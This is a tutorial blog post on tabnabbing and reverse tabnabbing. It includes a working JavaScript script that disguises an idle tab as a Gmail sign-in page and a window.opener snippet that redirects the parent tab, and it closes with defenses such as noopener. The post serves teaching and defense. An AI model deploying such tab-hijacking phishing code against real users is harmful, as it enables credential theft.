---
title: Tabnabbing & Reverse Tabnabbing
date: '2022-12-23'
tags: ['web', 'security', 'software']
draft: false
summary: Tabnabbing, with its reverse variant, is an exploit enabling malicious actors to replace one of your browser's opened window to a site of their choosing.
---

# Introduction

When working with links and windows on the web, there are many complex things to consider. Tabnabbing and reverse tabnabbing however, don't require complex factors in your code, and are both easy to pull off and defend against. These attacks mainly utilize the user's attention being somewhere else. While the user is occupied with something else, the tab is either replaced or changed in a way to permit a phishing attack.

# Tabnabbing

First, let's talk about the simple version: tabnabbing. The term was coined in [this article](http://www.icir.org/vern/cs161/demos/tabnabbing/tabnab.html) by Aza Raskin and the steps as explained by them are as follows:

1. A user navigates to your normal looking site.
2. You detect when the page has lost its focus and hasn’t been interacted with for a while.
3. You replace the favicon with the Gmail favicon, the title with “Gmail: Email from Google”, and the page with a Gmail login look-a-like. This can all be done with just a little bit of Javascript that takes place instantly.
4. As the user scans their many open tabs, the favicon and title act as a strong visual cue—memory is malleable and moldable and the user will most likely simply think they left a Gmail tab open. When they click back to the fake Gmail tab, they’ll see the standard Gmail login page, assume they’ve been logged out, and provide their credentials to log in. The attack preys on the perceived immutability of tabs.
5. After the user has entered their login information and you’ve sent it back to your server, you redirect them to Gmail. Because they were never logged out in the first place, it will appear as if the login was successful.

As Raskin notes in their article, the phishing content can be customized for each user in a spear phishing attack. The attack is very effective when posing as bank websites as a critical website warning the user that their login has timed out will not seem suspicious to the user. A user's company, password manager or even government login could be compromised if the victim is not paying attention.

Here's the attack script as seen on [this site's projects page](https://tabnabbing.vercel.app/projects) mostly adapted from [this gist](https://gist.github.com/cabe56/96b387a7f901f0219c8c):

<details>
<summary>Click to expand</summary>
```javascript
<script id="tabnabbing-example" type="application/javascript">
  {
    (function () {
      var TIMER = null
      var HAS_SWITCHED = false

      // Events
      window.onblur = function () {
        TIMER = setTimeout(changeItUp, 3500)
      }

      window.onfocus = function () {
        if (TIMER) clearTimeout(TIMER)
      }

      // Utils
      function setTitle(text) {
        document.title = text
      }

      // This favicon object rewritten from:
      // Favicon.js - Change favicon dynamically [http://ajaxify.com/run/favicon].
      // Copyright (c) 2008 Michael Mahemoff. Icon updates only work in Firefox and Opera.

      const favicon = {
        docHead: document.getElementsByTagName('head')[0],
        set: function (url) {
          this.addLink(url)
        },

        addLink: function (iconURL) {
          var link = document.createElement('link')
          link.type = 'image/x-icon'
          link.rel = 'shortcut icon'
          link.href = iconURL
          this.removeLinkIfExists()
          this.docHead.appendChild(link)
        },

        removeLinkIfExists: function () {
          var links = this.docHead.getElementsByTagName('link')
          for (var i = 0; i < links.length; i++) {
            var link = links[i]
            if (link.type == 'image/x-icon' && link.rel == 'shortcut icon') {
              this.docHead.removeChild(link)
              return // Assuming only one match at most.
            }
          }
        },

        get: function () {
          var links = this.docHead.getElementsByTagName('link')
          for (var i = 0; i < links.length; i++) {
            var link = links[i]
            if (link.type == 'image/x-icon' && link.rel == 'shortcut icon') {
              return link.href
            }
          }
        },
      }

      function createShield() {
        var div = document.createElement('div')
        div.style.position = 'fixed'
        div.style.top = 0
        div.style.left = 0
        div.style.backgroundColor = 'white'
        div.style.width = '100%'
        div.style.height = '100%'
        div.style.textAlign = 'center'
        document.body.style.overflow = 'hidden'

        // var img = document.createElement('img')
        // img.style.paddingTop = '15px'
        // img.src = 'http://img.skitch.com/20100524-b639xgwegpdej3cepch2387ene.png'

        var oldTitle = document.title
        var oldFavicon = favicon.get() || '/favicon.ico'

        div.innerHTML = `<body>
              <div class="box">
                      <h2>Sign in</h2>
                      <p>Use your Google Account</p>
                      <form onsubmit="alert('You got tabnabbed! I hope you didnt enter your password!')">
                        <div class="inputBox">
                          <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
                          <label>Username</label>
                        </div>
                        <div class="inputBox">
                              <input type="text" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
                              <label>Password</label>
                            </div>
                        <input type="submit" name="sign-in" value="Sign In">
                      </form>
                    </div>
              </body>`
        //TODO: Afterwards actually route the page to mail.google.com to make sure the victim doesn't notice we tabnabbed them

        // div.appendChild(img)
        document.body.appendChild(div)
      }
      function changeItUp() {
        if (HAS_SWITCHED == false) {
          createShield('https://mail.google.com')
          setTitle('Gmail: Email from Google')
          favicon.set('https://mail.google.com/favicon.ico')
          HAS_SWITCHED = true
        }
      }
    })()}

</script>
```
</details>

# Reverse Tabnabbing

This is an attack where the victim clicks on an unsafely routed link, and when they are spending time on the newly opened page, the original page is replaced with malicious content. The original site containing the unsafe link can be completely oblivious to these events, it only serves to be replaced once the user has clicked the unsafe link.

Explanation given by [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#tabnabbing) is as follows:

![With back link](https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png)

The attack is typically possible when the source site uses a target instruction in a html link to specify a target loading location that do not replace the current location and then let the current window/tab available and does not include any of the preventative measures detailed below.

The attack is also possible for link opened via the window.open javascript function.

Why is this harmful? Because neither the linked-to page, nor the phishing page lie on the same domain or origin as the original page. The site doesn't need to be compromised. It just needs to allow user-submitted anchors with target="\_blank".

## Examples

Vulnerable page ([landing page of this site](https://tabnabbing.vercel.app)):

```jsx
<button
  onClick={() => {
    window.open('https://tabnabbing.vercel.app/blog')
  }}
>
  Check out our blog!
</button>
```

Malicious site that is linked to ([the blog page of this site](https://tabnabbing.vercel.app/blog)):

```html
<script id="reverse-tabnabbing-example" type="application/javascript">
  {
    function () {
      if (window.opener) {
        window.opener.location = 'https://yildiz.edu.tr'
      }
    }()
  }
</script>
```

# Try it out

This blog contains code to enable tabnabbing and reverse tabnabbing attacks for educational purposes.
To get tabnabbed, visit the [projects](tabnabbing.vercel.app/projects) page and without leaving the page, either click on a project(which will open an external link in another tab) or just click away to another tab for a few seconds. When you look through your tabs, you might see a new fake gmail tab, with a fake gmail login page that contains a half-hearted attempt at imitating the real page's CSS. The phishing login can be improved by using a tool such as [SET](https://github.com/trustedsec/social-engineer-toolkit), this implementation is just for demonstration purposes.
If you would like to try out the reverse tabnabbing method, head to [the landing page of this site](tabnabbing.vercel.app) and click on the "announcement". When the new window is opened, you'll see the previous window changes to an unrelated site. This could be any site the attacker wants you to see, and if you're not paying attention it provides the attacker with an attack vector as big as their imagination.
Both attacks work on all major browsers, as long as the website contains the vulnerabilities described in the article.

# Solutions

The best method to ensure credentials safety on the web is to always use a password manager. There are many free and/or open source tools available, I personally use [Bitwarden](https://bitwarden.com/). There are credentials managers built into all major browsers that mostly negate these attacks and many more, because even if the user doesn't recognize that the login form they are about to fill is fake, the password manager will know, because the URL doesn't match the already-saved legit URL.

To prevent reverse tabnabbing and cut the back link, when developing websites with user-submitted content, add the attribute `rel="noopener"` on the tag used to create the link from the parent page to the child page. This attribute value cuts the link, but depending on the browser, lets referrer information be present in the request to the child page.
To also remove the referrer information use this attribute value: `rel="noopener noreferrer"`.

### Sources

- https://owasp.org/www-community/attacks/Reverse_Tabnabbing

- https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#tabnabbing

- http://www.icir.org/vern/cs161/demos/tabnabbing/tabnab.html

- https://gist.github.com/cabe56/96b387a7f901f0219c8c

- https://github.com/EdwinOtten/reverse-tabnabbing-demo/

- https://santexgroup.com/blog/what-is-reverse-tabnabbing-and-why-is-it-important-to-be-aware-of/

- https://github.com/trustedsec/social-engineer-toolkit

- http://danielstjules.github.io/blankshield/

---
